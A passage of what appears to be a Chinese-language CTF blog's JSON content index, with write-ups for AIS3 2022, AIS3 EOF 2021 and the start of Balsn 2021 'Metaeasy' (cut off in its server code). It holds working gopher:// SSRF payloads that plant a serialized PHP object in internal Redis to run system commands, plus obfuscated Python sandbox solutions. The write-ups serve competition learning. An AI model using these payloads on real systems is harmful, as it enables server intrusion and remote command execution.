\u003ccode\u003egopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A2%3A%5C%22ls%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22\u003c/code\u003e 將其設為 \u003ccode\u003eO:14:\u0026quot;SessionManager\u0026quot;:3:{s:3:\u0026quot;val\u0026quot;;s:2:\u0026quot;ls\u0026quot;;s:6:\u0026quot;encode\u0026quot;;s:6:\u0026quot;system\u0026quot;;s:6:\u0026quot;sessid\u0026quot;;s:4:\u0026quot;code\u0026quot;;}\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168681047-d59c3bac-65ee-43ae-a00c-e00e616549f1.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後將 cookie 切為 \u003ccode\u003efc57bda95a5184e55555\u003c/code\u003e 然後隨便看一個 url 可以發現成功 RCE。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168681126-6a23d53c-493c-49c6-96fe-7edfe8cd9145.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e用\u003ccode\u003egopher://192.168.224.2:6379/_SET%20fc57bda95a5184e55555%20%22O%3A14%3A%5C%22SessionManager%5C%22%3A3%3A%5C%7Bs%3A3%3A%5C%22val%5C%22%3Bs%3A9%3A%5C%22/readflag%5C%22%3Bs%3A6%3A%5C%22encode%5C%22%3Bs%3A6%3A%5C%22system%5C%22%3Bs%3A6%3A%5C%22sessid%5C%22%3Bs%3A4%3A%5C%22code%5C%22%3B%5C%7D%22\u003c/code\u003e 將其設為 \u003ccode\u003eO:14:\u0026quot;SessionManager\u0026quot;:3:{s:3:\u0026quot;val\u0026quot;;s:9:\u0026quot;/readflag\u0026quot;;s:6:\u0026quot;encode\u0026quot;;s:6:\u0026quot;system\u0026quot;;s:6:\u0026quot;sessid\u0026quot;;s:4:\u0026quot;code\u0026quot;;}\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168681275-3db45eb8-68a1-466d-bd64-dc5569362920.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後將 cookie 切為 \u003ccode\u003efc57bda95a5184e55555\u003c/code\u003e 便可以看到 flag。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/168681316-972fd3c8-472d-461f-add3-a50a971d0dc0.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-9\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{deadly_ssrf_to_rce}\u003c/code\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/ais3-pre-exam-2022-writeup/","title":"AIS3 Pre Exam 2022 Writeup"},{"content":"\u003ch2 id=\"leetcall\"\u003eleetcall\u003c/h2\u003e\n\u003ch3 id=\"題目\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149655714-e6376ea0-d898-4f29-9de4-d3036977f841.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"限制\"\u003e限制\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149655738-eba68a84-87fb-4f74-9869-4241f4084258.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"payload\"\u003epayload\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Problem 1: Hello\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(getattr(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Hello, \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{:}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e!\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;format\u0026#39;\u003c/span\u003e)(getattr(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;!\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eHello, \u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;join\u0026#39;\u003c/span\u003e)(getattr(getattr(open(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e),\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;read\u0026#39;\u003c/span\u003e)(),\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;splitlines\u0026#39;\u003c/span\u003e)())))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Problem 2: Fibonacci\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(getattr(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;join\u0026#39;\u003c/span\u003e)(map(str,map(round,map(getattr(\u003cspan style=\"color:#ae81ff\"\u003e0.4472135954999579\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__mul__\u0026#39;\u003c/span\u003e),map(getattr(\u003cspan style=\"color:#ae81ff\"\u003e1.618033988749895\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__pow__\u0026#39;\u003c/span\u003e),map(int,getattr(open(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e),\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;readlines\u0026#39;\u003c/span\u003e)())))))))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Problem 3: FizzBuzz\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egetattr(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;format\u0026#39;\u003c/span\u003e)(setattr(__builtins__,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e,range(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e10001\u003c/span\u003e)),setattr(__builtins__,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;b\u0026#39;\u003c/span\u003e,list(map(bool,map(getattr(\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__rmod__\u0026#39;\u003c/span\u003e),a)))),setattr(__builtins__,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e,list(map(bool,map(getattr(\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__rmod__\u0026#39;\u003c/span\u003e),a)))),print(getattr(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;join\u0026#39;\u003c/span\u003e)(map(getattr(str,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__add__\u0026#39;\u003c/span\u003e),map(getattr(str,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__add__\u0026#39;\u003c/span\u003e),map(getattr(str,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__mul__\u0026#39;\u003c/span\u003e),map(str,a),map(getattr(bool,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__and__\u0026#39;\u003c/span\u003e),b,c)),map(getattr(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Fizz\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__mul__\u0026#39;\u003c/span\u003e),map(getattr(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__eq__\u0026#39;\u003c/span\u003e),b))),map(getattr(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Buzz\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__mul__\u0026#39;\u003c/span\u003e),map(getattr(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__eq__\u0026#39;\u003c/span\u003e),c))))))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656065-11129a7b-6f05-44c2-b292-965b80a5de0b.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"flag\"\u003eflag\u003c/h3\u003e\n\u003cp\u003eFLAG{actually_you_can_also_solve_those_leetcode_challenges_in_this_way:D}\u003c/p\u003e\n\u003ch2 id=\"ssrf-challenge-or-not\"\u003eSSRF Challenge or Not?\u003c/h2\u003e\n\u003ch3 id=\"題目-1\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656247-59579593-98b6-4874-b6bf-14d99f59242f.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"網址\"\u003e網址\u003c/h3\u003e\n\u003cp\u003e\u003ca href=\"https://ssrf.h4ck3r.quest/\"\u003ehttps://ssrf.h4ck3r.quest/\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"解題\"\u003e解題\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656280-316252b6-c18f-4c9b-8319-541ebd1c23ce.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656292-74ee449f-133e-4779-b74a-4810ac094811.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656304-9e10382a-c94d-4af7-9f22-b9c08f7e894f.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656319-995c05b0-df12-4e72-af3a-3f9a1bff4ec0.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656323-ce056c33-43cb-49a2-ba7b-4d54fcfa6dbf.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656358-cf01ee72-ca11-4ae9-9cce-ece7979edab4.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656376-68d2fddc-2a70-41bb-a1f5-c6825d99d01e.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656409-8eabc8d6-9889-4969-94c2-3ea239b927a4.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656426-74cee109-ad40-4327-a4c7-ac389ce672ca.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656443-7e0201fb-8bf0-44f0-976d-a54b74958bee.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/149656461-15492549-47f7-418e-85a0-657c08f664d7.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"flag-1\"\u003eflag\u003c/h3\u003e\n\u003cp\u003eFLAG{well, maybe not? XD}\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/ais3-eof-2021-writeup/","title":"AIS3 EOF 2021 Writeup"},{"content":"\u003ch1 id=\"balsn-2021-writeup\"\u003ebalsn-2021-writeup\u003c/h1\u003e\n\u003ch2 id=\"戰績\"\u003e戰績\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795491-ff0795d1-44bb-493d-bd42-6d7af82e53f4.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795573-629c32d0-909f-4ef2-9316-cd585f376883.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch2 id=\"metaeasy\"\u003eMetaeasy\u003c/h2\u003e\n\u003ch3 id=\"題目\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/142795079-081b6121-de1a-42a8-b090-c859da245b43.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"server-code\"\u003eserver code\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python3\" data-lang=\"python3\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eMasterMetaClass\u003c/span\u003e(type):   \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e __new__(cls, class_name, class_parents, class_attr):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egetFlag\u003c/span\u003e(self):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Here you go, my master\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;flag\u0026#39;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        class_attr[getFlag\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e__name__] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e getFlag\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        attrs \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ((name, value) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e name, value \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e class_attr\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eitems() \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e name\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estartswith(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__\u0026#39;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        class_attr \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e dict((\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;IWant\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003ename\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eupper()\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Plz\u0026#39;\u003c/span\u003e, value) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e name, value \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e attrs)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        newclass \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e super()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e__new__(cls, class_name, class_parents, class_attr)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e newclass\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e __init__(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003eargv):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Bad guy! No Flag !!\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Illegal\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBalsnMetaClass\u003c/span\u003e(type):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egetFlag\u003c/span\u003e(self):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;You\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ere not Master! No Flag !!\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e __new__(cls, class_name, class_parents, class_attr):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        newclass \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e super()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e__new__(cls, class_name, class_parents, class_attr)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        setattr(newclass, cls\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egetFlag\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e__name__, cls\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003egetFlag)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e newclass\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esecure_vars\u003c/span\u003e(s):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    attrs \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {name:value \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e name, value \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e vars(s)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eitems() \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e name\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estartswith(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__\u0026#39;\u003c/span\u003e)}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e attrs\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esafe_dict \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;BalsnMetaClass\u0026#39;\u003c/span\u003e : BalsnMetaClass,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;MasterMetaClass\u0026#39;\u003c/span\u003e : MasterMetaClass,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;False\u0026#39;\u003c/span\u003e : \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;True\u0026#39;\u003c/span\u003e : \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;abs\u0026#39;\u003c/span\u003e : abs,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;all\u0026#39;\u003c/span\u003e : all,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;any\u0026#39;\u003c/span\u003e : any,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ascii\u0026#39;\u003c/span\u003e : ascii,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bin\u0026#39;\u003c/span\u003e : bin,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bool\u0026#39;\u003c/span\u003e : bool,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bytearray\u0026#39;\u003c/span\u003e : bytearray,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;bytes\u0026#39;\u003c/span\u003e : bytes,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;chr\u0026#39;\u003c/span\u003e : chr,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;complex\u0026#39;\u003c/span\u003e : complex,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;dict\u0026#39;\u003c/span\u003e : dict,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;dir\u0026#39;\u003c/span\u003e : dir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;divmod\u0026#39;\u003c/span\u003e : divmod,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;enumerate\u0026#39;\u003c/span\u003e : enumerate,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;filter\u0026#39;\u003c/span\u003e : filter,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;float\u0026#39;\u003c/span\u003e : float,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;format\u0026#39;\u003c/span\u003e : format,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e : hash,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;help\u0026#39;\u003c/span\u003e : help,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;hex\u0026#39;\u003c/span\u003e : hex,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;id\u0026#39;\u003c/span\u003e : id,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;int\u0026#39;\u003c/span\u003e : int,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;iter\u0026#39;\u003c/span\u003e : iter,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;len\u0026#39;\u003c/span\u003e : len,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;list\u0026#39;\u003c/span\u003e : list,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;map\u0026#39;\u003c/span\u003e : map,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;max\u0026#39;\u003c/span\u003e : max,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;min\u0026#39;\u003c/span\u003e : min,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;next\u0026#39;\u003c/span\u003e : next,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;oct\u0026#39;\u003c/span\u003e : 